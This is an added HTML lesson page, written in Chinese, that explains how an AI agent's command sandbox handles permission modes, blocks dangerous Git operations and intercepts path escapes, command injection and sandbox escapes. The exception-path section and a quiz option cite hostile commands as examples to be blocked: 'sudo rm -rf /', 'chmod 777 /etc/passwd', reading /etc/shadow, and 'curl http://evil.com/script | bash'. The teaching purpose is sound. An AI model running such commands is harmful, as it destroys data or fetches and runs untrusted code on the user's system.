@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>第 4 课 · 权限审批与沙盒逃逸防护</title>
+<style>
+  body { max-width: 760px; margin: 2rem auto; padding: 0 1.1rem; font-family: system-ui, -apple-system, "PingFang SC", "Microsoft YaHei", sans-serif; line-height: 1.75; color: #1a1a1a; background: #fcfcfc; }
+  h1 { font-size: 1.7rem; margin-top: 0.5rem; line-height: 1.3; }
+  h2 { font-size: 1.25rem; margin-top: 2.3rem; padding-bottom: 0.3rem; border-bottom: 2px solid #f0f0f0; }
+  h3 { font-size: 1.05rem; margin-top: 1.6rem; color: #2c3e50; }
+  code { background: #f0f2f5; padding: 0.1rem 0.4rem; border-radius: 4px; font-size: 0.88em; color: #c0341d; font-family: "SF Mono", Consolas, monospace; }
+  pre { background: #1e2127; color: #e6e6e6; padding: 1rem 1.2rem; border-radius: 8px; overflow-x: auto; font-size: 0.85rem; line-height: 1.6; }
+  pre code { background: none; color: inherit; padding: 0; }
+  .mission { background: linear-gradient(135deg, #f3f8ff, #eef4ff); border: 1px solid #d6e4ff; padding: 0.8rem 1rem; border-radius: 8px; font-size: 0.92rem; margin: 1.2rem 0; }
+  .mission b { color: #1d6fd6; }
+  blockquote { border-left: 3px solid #ddd; margin-left: 0; padding-left: 1rem; color: #555; }
+  .step { background: #fff; border: 1px solid #ebebeb; border-radius: 10px; padding: 0.6rem 1.1rem; margin: 0.7rem 0; box-shadow: 0 1px 3px rgba(0,0,0,0.03); }
+  .step .num { display: inline-block; background: #2c3e50; color: #fff; width: 1.6rem; height: 1.6rem; line-height: 1.6rem; text-align: center; border-radius: 50%; font-size: 0.85rem; font-weight: bold; margin-right: 0.5rem; }
+  .step .where { font-size: 0.8rem; color: #888; font-family: "SF Mono", Consolas, monospace; }
+  .side { background: #fffbea; border-left: 3px solid #f0c000; padding: 0.6rem 1rem; border-radius: 0 6px 6px 0; margin: 1.2rem 0; font-size: 0.9rem; }
+  .danger { background: #fff4f4; border-left: 3px solid #e05555; padding: 0.6rem 1rem; border-radius: 0 6px 6px 0; margin: 1.2rem 0; font-size: 0.9rem; }
+  details { background: #f7f9fc; border: 1px solid #e3e8ef; border-radius: 8px; padding: 0.7rem 1rem; margin: 0.8rem 0; }
+  summary { cursor: pointer; font-weight: 600; color: #2c3e50; }
+  details[open] summary { margin-bottom: 0.6rem; }
+  .quiz { background: #fff; border: 1px solid #e3e8ef; border-radius: 8px; padding: 0.5rem 1rem; margin: 0.6rem 0; }
+  .quiz p { font-weight: 600; margin: 0.6rem 0; }
+  .opt { display: block; padding: 0.35rem 0; color: #333; }
+  .cite { font-size: 0.85rem; color: #888; margin-top: 2.5rem; border-top: 1px solid #eee; padding-top: 0.6rem; }
+  .cite a, .reminder a { color: #1d6fd6; }
+  .reminder { background: #f5f5f5; padding: 0.8rem 1rem; border-radius: 6px; margin-top: 1.5rem; font-size: 0.9rem; }
+  .nav { margin-top: 2rem; font-size: 0.88rem; color: #aaa; }
+  .tag { display:inline-block; background:#eef4ff; color:#1d6fd6; font-size:0.72rem; padding:0.1rem 0.5rem; border-radius:4px; vertical-align:middle; }
+  table { width: 100%; border-collapse: collapse; font-size: 0.88rem; margin: 1rem 0; }
+  th, td { border: 1px solid #e3e8ef; padding: 0.5rem 0.7rem; text-align: left; }
+  th { background: #f7f9fc; font-weight: 600; }
+</style>
+</head>
+<body>
+
+<h1>第 4 课 · 权限审批与沙盒逃逸防护 <span class="tag">安全边界</span></h1>
+
+<div class="mission">
+<b>本节目标（对应使命 Success #4）</b>：学完你能解释四种会话权限模式的差异，理解安全策略中 Git 危险操作的拦截逻辑，掌握 7 条异常路径（路径越权、命令注入、沙盒逃逸、配置保护、超时中断、Shell 不兼容、CWD 失效）的拦截机制和涉及代码。
+</div>
+
+<p>前几课我们沿着"正常路径"追踪了命令执行的完整链路。这一课聚焦<b>第 5 层（权限审批）</b>和<b>所有异常/拦截路径</b>——理解"命令被拒绝时发生了什么"与理解"命令成功执行时发生了什么"同样重要。</p>
+
+<h2>一、会话权限模式（Layer 5）</h2>
+
+<p><code>core/session-permission-mode.ts</code> 定义了四种会话权限模式，决定命令是否需要用户审批：</p>
+
+<table>
+<tr><th>模式</th><th>值</th><th>行为</th></tr>
+<tr><td>AUTO</td><td><code>"auto"</code></td><td>默认模式。信息类工具（read、grep、ls 等）自动批准；副作用工具（bash、exec_command、write、edit）按风险分级触发审批</td></tr>
+<tr><td>OPERATE</td><td><code>"operate"</code></td><td>操作模式。大部分工具自动批准，适用于自动化场景（Bridge 通信）</td></tr>
+<tr><td>ASK</td><td><code>"ask"</code></td><td>询问模式。所有副作用工具都需要用户审批，适用于安全敏感场景</td></tr>
+<tr><td>READ_ONLY</td><td><code>"read_only"</code></td><td>只读模式。所有写操作被拒绝，exec_command 等工具不可用</td></tr>
+</table>
+
+<p><code>exec_command</code> 被归类为 <b>SIDE_EFFECT_TOOLS</b>（副作用工具）。在 AUTO 模式下，会根据命令的风险分级（safe/probe/mutation/dangerous/unknown）决定是否需要审批——safe 和 probe 通常自动批准，mutation 可能触发审批，dangerous 和 unknown 强制审批。</p>
+
+<div class="side">
+<b>PathGuard 与权限审批的关系：</b>两者是"与"的关系。PathGuard 负责"能不能做"的客观判定（文件级访问控制），权限审批负责"要不要问用户"的策略决策。PathGuard 拦截的路径永远不会到达审批层——审批层只看到"已通过安全检查"的命令。
+</div>
+
+<h2>二、安全策略（Safety Policy）</h2>
+
+<p><code>lib/permission/safety-policy.ts</code> 实现了命令级别的安全策略检查，主要针对 Git 危险操作：</p>
+
+<div class="step"><span class="num">1</span><b>Force Push 阻止</b>：<code>git push -f</code> / <code>--force</code> 被直接阻止<br><span class="where">lib/permission/safety-policy.ts</span></div>
+
+<div class="step"><span class="num">2</span><b>批量操作阻止</b>：<code>git push --tags</code>、<code>--all</code>、<code>--mirror</code> 全部被阻止<br><span class="where">要求逐 tag / 逐分支推送</span></div>
+
+<div class="step"><span class="num">3</span><b>嵌套 Shell 命令检测</b>：分析 <code>bash -c "..."</code>、<code>powershell -Command "..."</code>、<code>cmd /c ...</code> 中的嵌套命令，递归分类<br><span class="where">防止通过嵌套绕过风险分级</span></div>
+
+<h3>审批上下文构建</h3>
+
+<p>当需要审批时，<code>lib/permission/approval-review-context.ts</code> 构建结构化的审批上下文，包含：最近的对话历史摘要（最后 12 条消息，每条截断到 800 字符）、session transcript 尾部内容（最多 192KB）、工具调用参数摘要（提取 action、path、command、url 等关键字段），并过滤 <code>&lt;thinking&gt;</code> 标签避免干扰审批判断。</p>
+
+<h2>三、异常路径深度分析</h2>
+
+<p>命令执行全链路的每一层都可能触发异常或安全拦截。以下是与安全相关的 7 条关键异常路径：</p>
+
+<div class="danger">
+<b>异常路径 1：路径越权阻断</b><br>
+<b>触发场景：</b>LLM 尝试访问 <code>hanakoHome/auth.json</code> 或 <code>/etc/shadow</code> 等被保护路径。<br>
+<b>拦截点：</b>PathGuard.getAccessLevel() 的级联判定（优先级 1-2）。BLOCKED 文件/目录在任何操作下都返回 <code>{ allowed: false }</code>。<br>
+<b>结果：</b>LLM 收到 <code>"Sandbox blocked: [操作] 在 [路径] 被拒绝（访问级别: blocked）"</code>。<br>
+<b>涉及文件：</b><code>lib/sandbox/path-guard.ts</code>、<code>lib/sandbox/tool-wrapper.ts</code>
+</div>
+
+<div class="danger">
+<b>异常路径 2：命令注入检测与 preflight 拦截</b><br>
+<b>触发场景：</b>LLM 尝试执行 <code>sudo rm -rf /</code>、<code>chmod 777 /etc/passwd</code>、<code>reg delete HKLM\...</code>。<br>
+<b>拦截点：</b>tool-wrapper.ts 的 PREFLIGHT_PATTERNS 正则匹配。在 macOS/Linux 上作为体验层优化（OS 沙盒兜底），在 Windows 上作为安全层。<br>
+<b>涉及文件：</b><code>lib/sandbox/tool-wrapper.ts</code>（PREFLIGHT_UNIX / PREFLIGHT_WIN32）、<code>lib/exec-command/policy.ts</code>（DANGEROUS_EXECUTABLES）
+</div>
+
+<div class="danger">
+<b>异常路径 3：沙盒逃逸保护（多层防护）</b><br>
+<b>触发场景：</b>恶意命令尝试通过符号链接绕过路径限制、通过 <code>/proc</code> 访问宿主机进程、通过 Unix socket 逃逸。<br>
+<b>多层防护：</b><br>
+&bull; <b>PathGuard 符号链接解析</b>：<code>_resolveReal()</code> 使用 <code>fs.realpathSync()</code> 跟踪符号链接<br>
+&bull; <b>Bubblewrap namespace 隔离</b>：<code>--unshare-pid</code>（独立 PID namespace）+ <code>--new-session</code>（脱离终端控制）<br>
+&bull; <b>Bubblewrap 文件系统隔离</b>：<code>--tmpfs /tmp</code> 独立临时目录，敏感数据文件 bind <code>/dev/null</code><br>
+&bull; <b>Seatbelt deny default</b>：macOS 沙盒默认拒绝一切，仅显式 allow 的路径可访问<br>
+&bull; <b>网络隔离</b>：<code>--unshare-net</code>（bwrap）切断网络访问<br>
+<b>涉及文件：</b><code>lib/sandbox/bwrap.ts</code>、<code>lib/sandbox/seatbelt.ts</code>、<code>lib/sandbox/path-guard.ts</code>
+</div>
+
+<div class="danger">
+<b>异常路径 4：Managed Config 写入拦截</b><br>
+<b>触发场景：</b>LLM 尝试直接写入 <code>agents/&lt;name&gt;/config.yaml</code> 修改 agent 配置。<br>
+<b>拦截点：</b><code>createManagedConfigWriteGuard()</code>，即使路径在 PathGuard 中属于可写区域也拦截。<br>
+<b>结果：</b>返回错误消息指示必须通过 settings API 修改配置。<br>
+<b>涉及文件：</b><code>lib/sandbox/managed-config-guard.ts</code>
+</div>
+
+<p>Managed Config Guard 的核心实现极其简洁——它不关心 PathGuard 的访问级别，只在操作是 write/delete 且目标是 agent config 文件时直接拒绝：</p>
+
+<pre><code>// lib/sandbox/managed-config-guard.ts — 配置写入保护
+export function createManagedConfigWriteGuard({ hanakoHome }) {
+  return (absolutePath, operation) => {
+    if (operation !== "write" && operation !== "delete") return { allowed: true };
+    if (!isManagedAgentConfigPath(absolutePath, { hanakoHome })) return { allowed: true };
+    return {
+      allowed: false,
+      reason: "managed config files must be changed through settings APIs",
+    };
+  };
+}</code></pre>
+
+<div class="danger">
+<b>异常路径 5：命令超时与中断</b><br>
+<b>触发场景：</b>命令执行超过 <code>timeout</code> 或用户点击"中断"触发 <code>AbortSignal</code>。<br>
+<b>处理流程：</b><code>exec-helper.ts</code> 调用 <code>killTree(child.pid)</code> 杀死进程树。已收集的部分输出仍然返回给 LLM，不是全部丢弃。<br>
+<b>错误消息区分：</b><code>"aborted"</code> → "Command aborted"；<code>"timeout:"</code> → "Command timed out after X seconds"；其他 → 直接输出 err.message。<br>
+<b>涉及文件：</b><code>lib/sandbox/exec-helper.ts</code>、<code>lib/exec-command/runner.ts</code>
+</div>
+
+<div class="danger">
+<b>异常路径 6：Shell 语法不兼容（Windows POSIX heredoc）</b><br>
+<b>触发场景：</b>在 Windows 上执行包含 POSIX heredoc 语法（<code>&lt;&lt;EOF</code>）的命令。<br>
+<b>拦截点：</b><code>classifyExecCommand()</code> 中的 <code>hasWin32PosixHeredoc()</code> 检测，标记 <code>unsupportedSyntax: true</code>。<br>
+<b>结果：</b>工具入口层直接返回错误提示，指导 LLM 使用 PowerShell here-string 替代。命令根本不会进入执行阶段。<br>
+<b>涉及文件：</b><code>lib/exec-command/policy.ts</code>
+</div>
+
+<div class="danger">
+<b>异常路径 7：工作目录失效</b><br>
+<b>触发场景：</b>指定的工作目录不存在、不是目录、或是相对路径。<br>
+<b>拦截点：</b><code>lib/shell/execution-cwd.ts</code> 在 spawn 前做前置校验。定义了四种错误码：<code>HANA_EXEC_CWD_INVALID</code>、<code>HANA_EXEC_CWD_RELATIVE</code>、<code>HANA_EXEC_CWD_MISSING</code>、<code>HANA_EXEC_CWD_NOT_DIRECTORY</code>。<br>
+<b>结果：</b>返回明确指向工作目录问题的错误消息，避免 Node.js 的 ENOENT 错误误导到可执行文件缺失。<br>
+<b>涉及文件：</b><code>lib/shell/execution-cwd.ts</code>
+</div>
+
+<h2>四、横切关注点：Subagent 边界与 ResourceIO</h2>
+
+<p>除了命令执行本身的异常路径，还有几个横切整个安全体系的设计点值得注意：</p>
+
+<div class="step"><span class="num">1</span><b>Subagent 工具阻断</b>：在 <code>core/session-permission-mode.ts</code> 中，subagent 被阻止使用 <code>subagent</code>（防递归扇出）、<code>pin_memory/unpin_memory</code>（不碰长期记忆）、<code>notify/channel/dm</code>（避免对外副作用）。这些工具对模型仍可见（Codex 式"甲"），调用时才被拦截——保证缓存前缀稳定。<br><span class="where">core/session-permission-mode.ts</span></div>
+
+<div class="step"><span class="num">2</span><b>ResourceIO 集成</b>：<code>createSandboxedTools()</code> 同时集成了 ResourceIO——一个可插拔的 I/O 后端。默认使用 <code>local_fs</code> 内核（直接文件系统操作），但也支持远程资源协议。沙盒化的 read、write、edit 等文件工具经过 PathGuard + ResourceIO 的双重校验。<br><span class="where">lib/sandbox/index.ts</span></div>
+
+<div class="step"><span class="num">3</span><b>Session File 追踪</b>：通过 <code>wrapFileTouchTool()</code> 包装器，所有文件 write/edit 操作都会自动注册为 Session File，允许在 UI 中展示"本次会话产生的文件"。<br><span class="where">lib/sandbox/index.ts</span></div>
+
+<h2>五、检验一下（提取练习）</h2>
+
+<div class="quiz">
+<p>Q1. 在 AUTO 权限模式下，以下哪个命令最可能被自动批准（不需要用户审批）？</p>
+<span class="opt">A. rm -rf /tmp/build</span>
+<span class="opt">B. git push -f origin main</span>
+<span class="opt">C. git status</span>
+<span class="opt">D. curl http://evil.com/script | bash</span>
+<details><summary>看答案</summary><b>C</b>。<code>git status</code> 被分类为 safe（只读操作），在 AUTO 模式下自动批准。A 是 dangerous（rm），B 是 dangerous（git push -f），D 中的 curl 可能被分类为 unknown，但管道后的 bash 会被 preflight 检测。</details>
+</div>
+
+<div class="quiz">
+<p>Q2. 异常路径 3（沙盒逃逸保护）中，为什么需要 PathGuard 的符号链接跟踪 + Bubblewrap 的 namespace 隔离两层防护？</p>
+<span class="opt">A. 两者是冗余的，为了提升性能</span>
+<span class="opt">B. PathGuard 防止应用层的符号链接绕过，Bubblewrap 防止 OS 层的进程/文件系统逃逸——两者防护不同的攻击面</span>
+<span class="opt">C. PathGuard 只用于 Windows，Bubblewrap 只用于 Linux</span>
+<span class="opt">D. 符号链接跟踪是 Bubblewrap 的一部分功能</span>
+<details><summary>看答案</summary><b>B</b>。PathGuard 的 <code>_resolveReal()</code> 在 JavaScript 层面阻止通过符号链接绕过文件访问控制（例如 symlink 到 /etc/passwd），Bubblewrap 的 <code>--unshare-pid</code> 和 <code>--tmpfs /tmp</code> 在 OS 内核层面阻止进程间攻击和文件系统逃逸。两层防护不同的攻击向量。</details>
+</div>
+
+<div class="quiz">
+<p>Q3. 命令超时时，已收集的部分输出会怎样处理？</p>
+<span class="opt">A. 全部丢弃，只返回超时错误消息</span>
+<span class="opt">B. 仍然返回给 LLM——保留中断前的所有输出，并附上超时说明</span>
+<span class="opt">C. 只保留最后一行输出</span>
+<span class="opt">D. 写入临时文件但不告知 LLM</span>
+<details><summary>看答案</summary><b>B</b>。在 <code>runExecCommandDirect()</code> 的 catch 分支中，已通过 <code>CommandOutputCollector</code> 累积的输出会被保留并返回，同时附上相应的错误说明（aborted/timeout/error）。这确保 LLM 能看到命令在中断前产生了什么输出。</details>
+</div>
+
+<div class="cite">推荐一手资料：打开 <code>lib/permission/safety-policy.ts</code> 查看完整的 Git 危险操作检测规则；打开 <code>lib/sandbox/tool-wrapper.ts</code> 阅读 <code>checkCommandExecutionAccess()</code> 函数中 preflight + PathGuard 的串联逻辑。</div>
+
+<div class="reminder">有疑问？直接问我——我是你的 AI 教师。可以问：「如果我想添加一条新的 preflight 规则阻止 <code>iptables</code> 命令，应该在哪个文件中加？」「为什么异常路径 5 中超时后还要返回部分输出而不是全部丢弃？」下一课是<b>综合测验课</b>——完整 Mermaid 时序图 + 7 条异常路径回顾 + 覆盖全部 5 课的综合测验。</div>
+
+<div class="nav">课程 0004 / 沙盒执行全链路 · <a href="0003.html">← 上一课：Bubblewrap 容器执行</a> · <a href="0005.html">下一课：全链路时序与综合测验 →</a></div>
+
+</body>
+</html>
